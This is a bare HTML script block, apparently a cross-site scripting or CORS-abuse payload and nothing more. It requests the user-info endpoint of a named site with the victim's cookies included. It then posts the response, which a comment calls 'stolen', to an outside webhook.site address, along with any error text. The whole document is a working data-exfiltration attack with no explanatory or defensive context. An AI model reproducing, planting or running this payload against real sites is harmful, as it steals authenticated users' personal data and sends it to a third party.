<script>
fetch("https://nvio.mx/api/userinfo", {
  method: "GET",
  credentials: "include"
})
.then(res => res.text())
.then(data => {
  // Send the stolen response to your webhook
  fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
    method: "POST",
    headers: {
      "Content-Type": "text/plain"
    },
    body: data
  });
})
.catch(err => {
  // Send any error info to your webhook too
  fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
    method: "POST",
    body: "Fetch failed: " + err
  });
});
</script>
